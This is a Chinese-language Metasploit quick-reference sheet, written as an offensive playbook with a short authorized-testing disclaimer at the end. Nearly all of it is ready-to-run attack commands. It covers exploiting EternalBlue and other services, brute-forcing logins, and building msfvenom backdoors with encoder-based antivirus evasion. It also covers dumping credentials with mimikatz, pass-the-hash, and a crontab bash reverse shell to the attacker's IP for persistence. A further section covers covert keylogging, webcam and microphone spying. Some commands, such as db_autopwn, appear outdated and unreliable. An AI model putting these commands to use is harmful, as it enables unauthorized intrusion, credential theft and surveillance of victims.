
---

# Metasploit 速查公式卡（完整版）

> **核心思路**：搜索 → 选择 → 配置 → 攻击

---

## 目录

- [一、启动与基础命令](#一启动与基础命令)
- [二、搜索模块（找到武器）](#二搜索模块找到武器)
- [三、使用模块（上膛）](#三使用模块上膛)
- [四、设置参数（瞄准）](#四设置参数瞄准)
- [五、攻击！](#五攻击)
- [六、Meterpreter 常用命令（拿权后）](#六meterpreter-常用命令拿权后)
- [七、常用攻击模块速查](#七常用攻击模块速查)
- [八、常用辅助模块](#八常用辅助模块)
- [九、MSFVenom 木马生成](#九msfvenom-木马生成)
- [十、数据库与工作区](#十数据库与工作区管理大量目标)
- [十一、实战套路（一条龙）](#十一实战套路一条龙)
- [十二、常见报错与解决](#十二常见报错与解决)
- [十三、速记口诀](#十三速记口诀)
- [十四、附录：Kali 自带字典路径](#十四附录kali-自带字典路径)
- [十五、Evil-WinRM 补充（Windows 远程管理）](#十五evil-winrm-补充windows-远程管理)

---

## 一、启动与基础命令

```bash
# 启动 MSF（Kali 终端输入）
msfconsole                    # 启动（图标是 ASCII 艺术）
msfconsole -q                 # 静默启动（不显示 Banner）
msfconsole -r script.rc       # 加载资源脚本

# 基础命令
help                          # 查看所有命令（卡住时用）
help [命令名]                  # 查看特定命令帮助
search [关键词]               # 搜索模块（最重要！）
show options                  # 查看当前模块需要设置的参数
info                          # 查看模块详细信息（作者、漏洞描述、风险等级）
show info                     # 同上
exit                          # 退出 msfconsole
history                       # 查看命令历史
setg [参数] [值]              # 设置全局参数（所有模块共享）
unsetg [参数]                 # 取消全局参数
```

> **实战关联**：永远先 `search`，不要背模块名。

---

## 二、搜索模块（找到武器）

```bash
# 公式1：搜漏洞编号
search ms17-010               # 搜永恒之蓝
search cve:2021               # 搜 2021 年 CVE

# 公式2：搜服务名称
search vsftpd                 # 搜 vsftpd 相关漏洞
search smb                    # 搜 SMB 服务漏洞
search ssh                    # 搜 SSH 相关
search mysql                  # 搜 MySQL 相关

# 公式3：搜漏洞类型
search name:mysql             # 按名字搜
search type:exploit           # 只搜 exploit 攻击模块
search type:auxiliary         # 只搜辅助模块
search type:payload           # 只搜 payload
search platform:windows       # 只搜 Windows 平台
search platform:linux         # 只搜 Linux 平台
search platform:android       # 只搜 Android

# 公式4：高级搜索（组合）
search name:ms17 type:exploit platform:windows
search cve:2017 type:exploit

# 公式5：查看模块详情后使用
search ms17-010
info 0                        # 查看第一个模块详情
```

**套用示例**：
```bash
search ms17-010
search type:exploit platform:linux
```

---

## 三、使用模块（上膛）

```bash
# 公式1：按编号使用
use 0                         # 用 search 结果里的第 0 个
use 1                         # 用第 1 个

# 公式2：按完整路径使用
use exploit/windows/smb/ms17_010_eternalblue
use auxiliary/scanner/portscan/tcp

# 公式3：返回上一级
back                          # 退出当前模块

# 公式4：重新加载模块
reload                        # 修改模块后重新加载
```

> **实战关联**：`use` 之后，你就站在"武器"面前了。

---

## 四、设置参数（瞄准）

### 4.1 查看与设置基础参数

```bash
# 查看需要设置的参数
show options                  # 显示所有参数
show missing                  # 只显示未设置的参数

# 设置目标（必填）
set RHOSTS 192.168.1.100      # 靶机 IP（支持 CIDR）
set RHOST 192.168.1.100       # 单目标用这个
set RPORT 445                 # 目标端口

# 设置本机（反弹 shell 用）
set LHOST 192.168.1.50        # 你的 Kali IP
set LPORT 4444                # 你监听的端口

# 设置多目标
set RHOSTS 192.168.1.100-110  # IP 范围
set RHOSTS file:/root/targets.txt  # 从文件读取
set RHOSTS 192.168.1.0/24     # 整个网段
```

### 4.2 设置 Payload

```bash
# 设置 payload（攻击成功后干什么）
set PAYLOAD windows/x64/meterpreter/reverse_tcp   # 反弹 meterpreter
set PAYLOAD linux/x86/shell_reverse_tcp           # 反弹 Linux shell
set PAYLOAD cmd/unix/reverse_python               # Python 反弹 shell
set PAYLOAD windows/shell/reverse_tcp             # Windows 普通 shell

# 查看当前模块可用的 payload
show payloads                 # 列出所有可用 payload

# 查看目标版本
show targets                  # 列出可攻击的目标系统版本
set TARGET 0                  # 选自动目标（通常默认）
```

### 4.3 高级设置

```bash
# 通用设置
set threads 10                # 设置线程数
set VERBOSE true              # 显示详细信息（调试用）
set SSL true                  # 启用 SSL
set ExitOnSession false       # 攻击完成后不退出（可继续）

# 全局设置（所有模块共享）
setg LHOST 192.168.1.50
setg LPORT 4444
```

**套用示例（永恒之蓝）**：
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
set LPORT 4444
show options                  # 检查配置
```

> **实战关联**：参数不全会报错，多看 `show options`。

---

## 五、攻击！

```bash
# 公式1：标准攻击
exploit

# 公式2：快速攻击（同 exploit）
run

# 公式3：后台执行（不影响终端）
exploit -j
run -j

# 公式4：攻击失败时（强制攻击）
exploit -f

# 公式5：检查是否可利用
check                         # 检测目标是否存在漏洞

# 公式6：查看攻击结果
sessions -l                   # 列出所有会话
sessions -i 1                 # 进入会话 1（交互）
sessions -k 1                 # 终止会话 1
sessions -K                   # 终止所有会话

# 公式7：后台会话管理
ctrl + z                      # 将当前会话放到后台
background                    # 同上
```

**套用示例**：
```bash
exploit
sessions -l
sessions -i 1
```

**成功标志**：看到 `meterpreter >` 或 `shell >` 提示符。

---

## 六、Meterpreter 常用命令（拿权后）

### 6.1 基础操作

```bash
help                          # 查看 meterpreter 所有命令
sysinfo                       # 查看目标系统信息
getuid                        # 查看当前用户
getpid                        # 查看当前进程 ID
ps                            # 查看所有进程
shell                         # 进入系统 shell（类似 cmd）
exit                          # 退出 meterpreter
quit                          # 同上
background                    # 放到后台
sessions -i 1                 # 切回 session
```

### 6.2 文件操作

```bash
pwd                           # 当前目录
ls                            # 列出文件
cd C:\\                       # 切换目录
cat file.txt                  # 查看文件内容
upload /root/backdoor.exe C:\\  # 上传文件
download C:\\secret.txt /root/  # 下载文件
rm file.txt                   # 删除文件
mkdir folder                  # 创建文件夹
search -f *.txt -d C:\\       # 搜索文件
edit file.txt                 # 编辑文件（Vim 风格）
```

### 6.3 权限提升

```bash
getsystem                     # 尝试提权到 SYSTEM（Windows）
run post/windows/escalate/bypassuac  # 绕过 UAC
run post/windows/escalate/getsystem   # 提权模块

# Linux 提权
run post/linux/gather/enum_configs
run post/multi/recon/local_exploit_suggester  # 建议可用提权方式
```

### 6.4 获取凭证

```bash
hashdump                     # 抓 Windows 密码哈希（SAM）
run post/windows/gather/hashdump  # 同上（模块版）
run post/windows/gather/credentials/mimikatz  # 用 mimikatz 抓明文密码

# Linux
run post/linux/gather/hashdump
cat /etc/shadow              # 手动查看（需要 root）
```

### 6.5 持久化后门

```bash
# Windows 持久化
run persistence -U -i 10 -p 4444 -r 你的IP   # 开机自启后门
run persistence -X -i 10 -p 4444 -r 你的IP   # 系统启动时加载
run scheduleme                # 计划任务后门

# Linux 持久化
run persistence -U -i 10 -p 4444 -r 你的IP   # 同样支持
echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/你的IP/4444 0>&1"' >> /etc/crontab
```

### 6.6 信息收集（偷东西）

```bash
# 屏幕截图
screenshot                    # 截图保存
screenshot -h                 # 查看截图选项
screenshot -q 50              # 低质量截图

# 键盘记录
keyscan_start                 # 开始键盘记录
keyscan_dump                  # 导出键盘记录
keyscan_stop                  # 停止记录

# 摄像头
webcam_snap                   # 偷拍（如果对方有摄像头）
webcam_list                   # 列出可用摄像头
webcam_stream                 # 实时视频流

# 麦克风
record_mic -d 5              # 录音 5 秒

# 剪贴板
getsystem                     # 需要系统权限
clipboard_get                 # 获取剪贴板内容
```

### 6.7 横向移动（内网渗透）

```bash
# 网络信息
arp                           # 查看内网 ARP 表
ipconfig / ifconfig           # 查看网络配置
netstat                       # 查看网络连接
route                         # 查看路由表

# 扫描内网
run post/windows/gather/arp_scanner  # ARP 扫描内网
run post/multi/manage/autoroute       # 添加路由，访问内网其他网段
run auxiliary/scanner/portscan/tcp    # 端口扫描（需从 MSF 主界面跑）

# 内网 SMB 扫描
run post/windows/gather/enum_share    # 枚举共享
run post/windows/gather/enum_snmp     # 枚举 SNMP
```

> **实战关联**：Meterpreter 是你的"内网航母"。

---

## 七、常用攻击模块速查

### 7.1 永恒之蓝（Windows 7/2008）
```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [目标IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST [你的IP]
exploit
```

### 7.2 永恒之蓝检测（先扫后打）
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.0/24
run
# 找到漏洞主机后再用 exploit
```

### 7.3 Apache Struts2（Java 网站 RCE）
```bash
use exploit/multi/http/struts2_rest_xstream
set RHOSTS [目标IP]
set TARGETURI /orders/3
set PAYLOAD linux/x86/meterpreter/reverse_tcp
exploit
```

### 7.4 vsftpd 2.3.4（Linux 后门）
```bash
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS [目标IP]
exploit
# 成功后直接进入 shell
```

### 7.5 SSH 爆破（弱密码）
```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS [目标IP]
set USER_FILE /usr/share/wordlists/metasploit/ssh_default_user.txt
set PASS_FILE /usr/share/wordlists/metasploit/ssh_default_pass.txt
run
```

### 7.6 RDP 爆破（Windows 远程桌面）
```bash
use auxiliary/scanner/rdp/rdp_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/ssh_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### 7.7 SMB 爆破（Windows 文件共享）
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/smb_users.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### 7.8 Web 漏洞（SQL 注入拿 shell）
```bash
use exploit/multi/http/sqlmap
set RHOSTS [目标IP]
set TARGETURI /page.php?id=1
exploit
```

### 7.9 Tomcat 管理后台部署（弱密码）
```bash
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS [目标IP]
set USERNAME admin
set PASSWORD admin
set PAYLOAD java/jsp_shell_reverse_tcp
exploit
```

---

## 八、常用辅助模块

### 8.1 端口扫描
```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.0/24
set PORTS 1-1000
set THREADS 20
run
```

### 8.2 SMB 漏洞检测（永恒之蓝）
```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.1.100
run
```

### 8.3 弱密码爆破（FTP）
```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/ftp_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/ftp_pass.txt
run
```

### 8.4 MySQL 爆破
```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/mysql_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/mysql_pass.txt
run
```

### 8.5 HTTP 目录扫描
```bash
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.100
set DICTIONARY /usr/share/wordlists/dirb/common.txt
run
```

### 8.6 子域名爆破
```bash
use auxiliary/scanner/dns/dns_enum
set DOMAIN example.com
run
```

### 8.7 服务发现（自动扫描）
```bash
use auxiliary/scanner/discovery/arp_sweep
set RHOSTS 192.168.1.0/24
run
```

---

## 九、MSFVenom 木马生成

### 9.1 基础语法
```bash
msfvenom -p [payload] LHOST=[IP] LPORT=[端口] -f [格式] -o [输出文件]
```

### 9.2 常见 Payload 生成

```bash
# Windows 可执行文件（meterpreter）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o /tmp/backdoor.exe

# Windows 可执行文件（shell）
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f exe -o /tmp/shell.exe

# Windows 无文件 PowerShell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f psh-reflection -o /tmp/backdoor.ps1

# Linux ELF
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f elf -o /tmp/backdoor.elf

# Linux 脚本
msfvenom -p cmd/unix/reverse_python LHOST=192.168.1.50 LPORT=4444 -f raw -o /tmp/backdoor.py

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -o /tmp/backdoor.apk

# MacOS
msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f macho -o /tmp/backdoor.macho

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o /tmp/backdoor.php

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f raw -o /tmp/backdoor.jsp

# ASP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f asp -o /tmp/backdoor.asp
```

### 9.3 编码绕过（免杀）
```bash
# 使用编码器（基础）
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/encoded.exe

# 多格式打包
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -e x86/shikata_ga_nai -i 10 -f exe -o /tmp/backdoor.exe

# 生成 shellcode（C 格式）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.50 LPORT=4444 -f c -o /tmp/shellcode.c
```

### 9.4 监听 Handler
```bash
# 启动监听（配套 msfvenom）
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp  # 必须与木马一致
set LHOST 192.168.1.50
set LPORT 4444
exploit -j
```

---

## 十、数据库与工作区（管理大量目标）

### 10.1 启动数据库
```bash
sudo systemctl start postgresql
sudo systemctl enable postgresql
msfdb init                     # 初始化数据库
msfdb status                   # 查看状态
msfdb reinit                   # 重置数据库（清空所有数据）
```

### 10.2 工作区管理
```bash
workspace -a 目标公司           # 创建工作区
workspace -d 目标公司           # 删除工作区
workspace                       # 查看所有工作区
workspace 目标公司              # 切换工作区
workspace -r 旧名 新名          # 重命名工作区
```

### 10.3 导入扫描结果
```bash
db_import /root/nmap.xml       # 导入 Nmap 结果
db_import /root/scan.xml       # 支持 Nmap、Nessus、OpenVAS
hosts                          # 查看所有主机
hosts -c address,os_name       # 指定列查看
services                       # 查看所有服务
services -p 80                 # 查看特定端口
vulns                          # 查看已知漏洞
loot                           # 查看收集到的凭证
creds                          # 查看凭证
```

### 10.4 自动攻击（配合数据库）
```bash
# 搜索并自动匹配模块
analyze                        # 自动分析目标漏洞
db_autopwn                    # 自动攻击（需谨慎）
vulns                          # 查看已确认的漏洞
exploit -j                     # 后台批量攻击
```

---

## 十一、实战套路（一条龙）

### 场景1：拿到一个网站 Webshell，想提权到服务器
```bash
# 1. 生成木马
msfvenom -p windows/meterpreter/reverse_tcp LHOST=你的IP LPORT=4444 -f exe -o /tmp/backdoor.exe

# 2. 通过 Webshell 上传并执行木马

# 3. Kali 监听
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 你的IP
set LPORT 4444
exploit

# 4. 成功后进入 meterpreter
sessions -i 1
getsystem                     # 提权
hashdump                      # 抓密码
```

### 场景2：内网横向移动
```bash
# 1. 拿到一台内网机器 meterpreter
# 2. 添加路由（让 MSF 能访问内网其他机器）
run post/multi/manage/autoroute
run autoroute -p              # 查看路由

# 3. 扫内网其他机器
background
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.2.0/24
set PORTS 445,3389,22,80
run

# 4. 找到目标后，用对应漏洞攻击
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS [新目标IP]
set PAYLOAD windows/x64/meterpreter/reverse_tcp
exploit
```

### 场景3：打一台 Linux 靶机
```bash
# 使用 vsftpd 后门
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.1.100
exploit
# 成功后直接进入 shell，输入 whoami 验证

# 或使用 SSH 爆破
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 192.168.1.100
set USER_FILE /usr/share/wordlists/metasploit/ssh_default_user.txt
set PASS_FILE /usr/share/wordlists/rockyou.txt
run
```

### 场景4：抓取 Windows 登录密码
```bash
# Meterpreter 中
load kiwi                      # 加载 mimikatz 模块
creds_all                       # 抓取所有凭证
msv                             # 抓取 MSV 哈希
wdigest                         # 抓取 wdigest 明文
```

### 场景5：Web 渗透完整流程
```bash
# 1. 先用 auxiliary 扫描
use auxiliary/scanner/http/dir_scanner
set RHOSTS [目标IP]
run

# 2. 发现后台登录页
use auxiliary/scanner/http/http_login
set RHOSTS [目标IP]
set TARGETURI /admin/login.php
run

# 3. 尝试上传漏洞
use exploit/multi/http/php_include
set RHOSTS [目标IP]
set TARGETURI /page.php?file=
exploit
```

---

## 十二、常见报错与解决

| 报错 | 原因 | 解决方案 |
|------|------|----------|
| `Exploit failed: No suitable target found` | 无合适目标 | `set TARGET 0`（自动），或 `show targets` 手动选 |
| `Payload failed: No payload configured` | 未设置 Payload | `set PAYLOAD [路径]` |
| `Exploit failed: The connection was refused` | 端口未开放或防火墙拦截 | 用 `nmap` 确认端口状态 |
| `Sessions: No sessions` | 攻击失败 | 检查 RHOSTS、LHOST、端口是否正确 |
| `Exploit failed: Unable to find a compatible payload` | Payload 不兼容 | `show payloads` 选择兼容的 |
| `[*] Meterpreter session 1 opened, but it's dead` | 会话已断开 | 重新攻击，检查网络稳定性 |
| `[-] Exploit failed: No response from target` | 目标无响应 | 检查目标 IP 是否正确，是否开机 |
| `[-] Exploit failed: The target is not vulnerable` | 目标不存在漏洞 | 换其他攻击模块 |
| `[*] Started reverse TCP handler on X.X.X.X:4444` | 监听成功 | 等待目标回连（需要目标执行木马） |

---

## 十三、速记口诀

```
search 找武器，use 端上膛
options 查参数，set 填目标
exploit 开火，sessions 接管
meterpreter 在手，内网横着走

msfvenom 造木马，handler 来接驾
bypassuac 提权，hashdump 抓密码
screenshot 截屏，keyscan 记录
autoroute 加路由，横向就是爽
```

---

## 十四、附录：Kali 自带字典路径

```bash
# Metasploit 专用字典
/usr/share/wordlists/metasploit/
├── ftp_users.txt
├── ftp_pass.txt
├── ssh_default_user.txt
├── ssh_default_pass.txt
├── smb_users.txt
├── smb_pass.txt
└── mysql_users.txt

# 通用字典
/usr/share/wordlists/dirb/
├── common.txt              # 常用目录（4612 条）
├── big.txt                 # 更大目录
└── small.txt

/usr/share/wordlists/dirbuster/
└── directory-list-2.3-medium.txt  # 大规模目录

# 密码字典
/usr/share/wordlists/rockyou.txt.gz   # 经典密码（需解压）
/usr/share/wordlists/fasttrack.txt    # FastTrack 密码

# 解压 rockyou
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# 自定义字典位置
/root/wordlists/              # 建议自己存放
```

---

## 十五、Evil-WinRM 补充（Windows 远程管理）

Evil-WinRM 是一款 Windows 远程管理工具，常用于 Windows 内网渗透，可以替代 PowerShell Remoting。

```bash
# 安装（Kali 自带）
sudo apt install evil-winrm

# 基础连接（需要凭据）
evil-winrm -i 192.168.1.100 -u Administrator -p 'password'

# 带哈希连接（PTH 攻击）
evil-winrm -i 192.168.1.100 -u Administrator -H 'NTLM哈希'

# 上传文件
upload /root/backdoor.exe

# 下载文件
download C:\secret.txt

# 执行 PowerShell 脚本
evil-winrm -i 192.168.1.100 -u Administrator -p 'password' -s /root/scripts/
# 然后在 WinRM 中：Invoke-Command -ScriptBlock { ... }

# 交互式 shell
evil-winrm -i 192.168.1.100 -u Administrator -p 'password'
> whoami
> ipconfig
> net user
```

---

> **⚠️ 免责声明**：本文档仅用于授权渗透测试和安全学习。请在合法的靶场环境（如 DVWA、HackTheBox、VulnHub）中练习。未经授权攻击他人系统属于违法行为。

---
